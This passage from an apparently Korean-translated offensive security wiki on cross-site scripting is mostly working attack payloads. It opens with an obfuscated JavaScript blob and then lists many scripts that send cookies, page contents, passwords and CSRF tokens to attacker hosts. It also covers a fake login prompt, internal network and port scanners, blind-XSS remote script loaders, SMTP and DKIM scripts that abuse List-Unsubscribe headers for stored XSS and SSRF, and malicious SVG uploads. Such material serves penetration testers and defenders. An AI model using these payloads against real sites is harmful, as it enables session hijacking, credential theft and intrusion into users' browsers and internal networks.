(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS의 일반 payloads

### 여러 payloads를 한 번에


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

사용자가 iframe을 벗어나지 않고 페이지 내에서 이동하도록 유도하고, 그의 행동(폼으로 전송된 정보 포함)을 탈취합니다:


{{#ref}}
../iframe-traps.md
{{#endref}}

### Cookies 가져오기
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> HTTPOnly 플래그가 쿠키에 설정되어 있으면 JavaScript에서 **cookies에 접근할 수 없습니다**. 하지만 운이 좋다면 이 보호를 우회할 수 있는 [몇 가지 방법](../hacking-with-cookies/index.html#httponly)이 있습니다.
 
### 페이지 콘텐츠 탈취
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### 내부 IPs 찾기
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_짧은 시간은 응답하는 포트를 나타냅니다_ _긴 시간은 응답이 없음을 나타냅니다._

Chrome에서 차단된 포트 목록은 [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc)에서, Firefox에서는 [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist)에서 확인하세요.

### 자격 증명 요청 박스
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Auto-fill passwords capture
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
When any data is introduced in the password field, the username and password is sent to the attackers server, even if the client selects a saved password and don't write anything the credentials will be ex-filtrated.

### Hijack form handlers to exfiltrate credentials (const shadowing)

페이지에서 중요한 handler (e.g., `function DoLogin(){...}`)가 나중에 선언되고, 당신의 payload가 더 일찍 실행된다면 (e.g., via an inline JS-in-JS sink), 동일한 이름의 `const`를 먼저 정의하여 handler를 선점하고 잠가버리세요. 이후의 function 선언은 `const` 이름을 재바인딩할 수 없으므로 당신의 hook이 제어권을 유지하게 됩니다:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
참고
- 이는 실행 순서에 의존합니다: your injection은 정식 선언보다 먼저 실행되어야 합니다.
- 만약 your payload가 `eval(...)`로 감싸여 있다면, `const/let` 바인딩은 글로벌이 되지 않습니다. 진정한 전역(다시 바인딩할 수 없는) 바인딩을 확보하려면 섹션 “Deliverable payloads with eval(atob()) and scope nuances”의 동적 `<script>` injection 기법을 사용하세요.
- 키워드 필터가 코드를 차단할 때는 위에서 보인 것처럼 Unicode-escaped identifiers나 `eval(atob('...'))` 전달 방식을 결합해서 사용하세요.

### Keylogger

github에서 찾아보니 몇 가지가 있었습니다:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- You can also use metasploit `http_javascript_keylogger`

### Stealing CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### PostMessage 메시지 탈취
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### PostMessage-origin script loaders (opener-gated)

페이지가 **`postMessage`로부터 받은 `event.origin`을 저장하고 이후 이를 script URL에 이어붙이면**, 전송자는 로드된 JS의 **origin**을 제어한다:
```javascript
window.addEventListener('message', (event) => {
if (event.data.msg_type === 'IWL_BOOTSTRAP') {
localStorage.setItem('CFG', {host: event.origin, pixelID: event.data.pixel_id});
startIWL(); // later loads `${host}/sdk/${pixelID}/iwl.js`
}
});
```
Exploitation recipe (from CAPIG):

- **Gates**: `window.opener`가 존재하고 `pixel_id`가 allowlisted일 때만 동작함; **origin은 절대 검사되지 않음**.
- **Use CSP-allowed origin**: victim CSP에 이미 허용된 도메인으로 피벗(예: analytics를 허용하는 로그아웃된 help 페이지인 `*.THIRD-PARTY.com`)하고 takeover/XSS/upload를 통해 그곳에 `/sdk/<pixel_id>/iwl.js`를 호스팅.
- **Restore `opener`**: Android WebView에서 `window.name='x'; window.open(target,'x')`는 페이지를 자신의 opener로 만듦; hijacked iframe에서 악성 `postMessage`를 전송.
- **Trigger**: iframe이 `{msg_type:'IWL_BOOTSTRAP', pixel_id:<allowed>}`를 post함; parent는 그 후 CSP-allowed origin에서 공격자 `iwl.js`를 로드하여 실행함.

이는 origin-less `postMessage` 검증을, 정책상 이미 허용된 아무 origin에 착지할 수 있다면 CSP를 통과해 살아남는 **remote script loader primitive**로 바꾼다.

### 백엔드 JS concatenation을 통한 Supply-chain stored XSS

백엔드가 **사용자 제어 값들과 JS 문자열을 concatenating하여 shared SDK를 빌드할 때**, 작은 따옴표나 구조를 깨뜨리는 입력(quote/structure breaker)은 모든 소비자에게 제공되는 스크립트를 주입할 수 있다:

- 예시 패턴 (Meta CAPIG): 서버가 `cbq.config.set("<pixel>","IWLParameters",{params: <user JSON>});`를 `capig-events.js`에 그대로 추가함.
- `'` 또는 `"]}`를 주입하면 literal/object가 닫히고 공격자 JS가 추가되어, 이를 로드하는 모든 사이트(퍼스트파티 및 서드파티)에 대해 **stored XSS**가 생성됨.

### escaping이 비활성화된 경우 생성된 리포트에서의 Stored XSS

업로드된 파일을 파싱하고 그 메타데이터를 escaping이 비활성화된 상태로(예: `|safe`, custom renderers) HTML 리포트에 출력하면, 그 메타데이터는 **stored XSS sink**가 된다. 예시 흐름:
```python
xmlhost = data.getAttribute(f'{ns}:host')
ret_list.append(('dialer_code_found', (xmlhost,), ()))
'title': a_template['title'] % t_name  # %s fed by xmlhost
```
Django 템플릿이 `{{item|key:"title"|safe}}`를 렌더링하므로 공격자 HTML이 실행됩니다.

**Exploit:** report에 도달하는 manifest/config 필드에 **entity-encoded HTML**을 넣으세요:
```xml
<data android:scheme="android_secret_code"
android:host="&lt;img src=x onerror=alert(document.domain)&gt;"/>
```
`|safe`로 렌더링되면, 보고서는 `<img ...>`를 출력하고 뷰어가 볼 때 JS를 실행합니다.

**Hunting:** 파싱된 필드를 `%s`/f-strings에서 재사용하고 auto-escape를 비활성화하는 report/notification builders를 찾아보세요. 업로드된 manifest/log/archive에 포함된 한 개의 인코딩된 태그가 모든 뷰어에 대해 XSS를 지속시킵니다.

### Abusing Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Accessing Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

다음도 사용할 수 있습니다: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - 숨겨진 콘텐츠에 접근

From [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) it's possible to learn that even if some values disappear from JS, it's still possible to find them in JS attributes in different objects. For example, an input of a REGEX is still possible to find it after the value of the input of the regex was removed:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## 다른 취약점을 악용한 XSS

### XSS in Markdown

렌더링되는 Markdown 코드를 주입할 수 있나? 어쩌면 XSS를 얻을 수 있다! 확인:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS to SSRF

캐싱을 사용하는 **사이트에서 XSS를 발견했나**? Edge Side Include Injection을 통해 **이를 SSRF로 업그레이드**해 보라. 다음 payload:
```python
<esi:include src="http://yoursite.com/capture" />
```
사용하여 cookie 제한, XSS 필터 등을 우회하는 데 사용하세요!\
이 기법에 대한 자세한 정보: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### 동적으로 생성된 PDF에서의 XSS

웹 페이지가 사용자 제어 입력으로 PDF를 생성하는 경우, PDF를 생성하는 **봇을 속여** 임의의 **JS 코드를 실행**하게 할 수 있습니다.\
따라서, **PDF 생성 봇이** 어떤 종류의 **HTML** **태그를 발견하면**, 이를 **해석**하고 이 동작을 **악용**하여 **Server XSS**를 일으킬 수 있습니다.

{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

HTML 태그를 주입할 수 없다면 **PDF 데이터 주입**을 시도할 가치가 있습니다:

{{#ref}}
pdf-injection.md
{{#endref}}

### Amp4Email에서의 XSS

AMP는 모바일 장치에서 웹 페이지 성능을 가속화하는 것을 목표로 하며, 속도와 보안을 중시하면서 기능을 위해 JavaScript가 보완된 HTML 태그를 포함합니다. 다양한 기능을 위한 컴포넌트를 지원하며, 이는 [AMP components](https://amp.dev/documentation/components/?format=websites)에서 확인할 수 있습니다.

[**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) 포맷은 특정 AMP 컴포넌트를 이메일로 확장하여, 수신자가 이메일 내에서 직접 콘텐츠와 상호작용할 수 있게 합니다.

Example [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Abuse (Webmail XSS & SSRF)

RFC 2369의 `List-Unsubscribe` 헤더는 공격자가 제어하는 URI를 포함하며, 많은 웹메일 및 메일 클라이언트가 이를 자동으로 "Unsubscribe" 버튼으로 변환합니다. 이러한 URI가 검증 없이 렌더링되거나 페치될 경우, 이 헤더는 stored XSS(구독 취소 링크가 DOM에 배치된 경우) 및 SSRF(서버가 사용자를 대신해서 unsubscribe 요청을 수행하는 경우)를 위한 주입 지점이 됩니다.

#### `javascript:` URI를 통한 Stored XSS

1. 스팸 필터가 차단하지 않도록 메시지의 나머지 부분은 정상으로 유지하면서, 헤더가 `javascript:` URI를 가리키도록 자신에게 이메일을 보냅니다.
2. UI가 해당 값을 렌더링하는지 확인합니다(많은 클라이언트는 이를 "List Info" 패널에 표시함). 그리고 생성된 `<a>` 태그가 `href`나 `target` 같은 공격자가 제어하는 속성을 상속하는지 확인합니다.
3. 링크가 `target="_blank"`을 사용하는 경우(예: CTRL+click, 중간 클릭, 또는 "open in new tab") 실행을 유발합니다; 브라우저는 제공된 JavaScript를 웹메일 애플리케이션의 오리진에서 평가합니다.
4. stored-XSS primitive를 관찰합니다: 페이로드는 이메일에 지속되며 실행하려면 클릭만 필요합니다.
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
URI의 줄바꿈 바이트 (`%0a`)는 Horde IMP H5와 같은 취약한 클라이언트에서 렌더링 파이프라인을 통과하면서 특이한 문자들도 그대로 유지되어 앵커 태그 내부에 문자열을 있는 그대로 출력함을 보여준다.

<details>
<summary>악의적인 List-Unsubscribe 헤더를 전송하는 최소한의 SMTP PoC</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### 서버 측 구독 해지 프록시 -> SSRF

일부 클라이언트(예: Nextcloud Mail app)는 구독 해지 동작을 서버 측에서 프록시합니다: 버튼을 클릭하면 서버가 제공된 URL을 자체적으로 가져오도록 지시합니다. 이로 인해 헤더가 SSRF 원시 primitive가 되며, 특히 관리자가 `'allow_local_remote_servers' => true`로 설정하면(자세한 내용은 [HackerOne report 2902856](https://hackerone.com/reports/2902856)), loopback 및 RFC1918 대역으로의 요청을 허용합니다.

1. **이메일 작성** where `List-Unsubscribe` targets an attacker-controlled endpoint (blind SSRF의 경우 Burp Collaborator / OAST를 사용).
2. **`List-Unsubscribe-Post: List-Unsubscribe=One-Click`를 유지** so the UI shows a single-click unsubscribe button.
3. **신뢰 요구 사항을 충족**: 예를 들어 Nextcloud는 메시지가 DKIM을 통과할 때만 HTTPS unsubscribe 요청을 수행하므로, 공격자는 자신이 제어하는 도메인으로 이메일에 서명해야 합니다.
4. **대상 서버에서 처리하는 메일박스로 메시지 전달**하고 사용자가 unsubscribe 버튼을 클릭할 때까지 기다립니다.
5. **서버 측 콜백 관찰**을 collaborator endpoint에서 확인한 후, primitive가 확인되면 내부 주소로 피벗합니다.
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>DKIM 서명된 List-Unsubscribe 메시지 (SSRF 테스트용)</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**테스트 노트**

- OAST 엔드포인트를 사용해 blind SSRF hits를 수집한 다음, primitive가 확인되면 `List-Unsubscribe` URL을 `http://127.0.0.1:PORT`, metadata services, 또는 다른 내부 호스트로 조정하세요.
- unsubscribe helper는 종종 애플리케이션과 동일한 HTTP stack을 재사용하므로, 해당 helper의 proxy settings, HTTP verbs, 및 header rewrites를 상속받습니다. 이로 인해 [SSRF methodology](../ssrf-server-side-request-forgery/README.md)에 설명된 추가적인 traversal 트릭을 수행할 수 있습니다.

### XSS 파일 업로드 (svg)

다음과 같은 파일을 이미지로 업로드하세요 (출처: [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
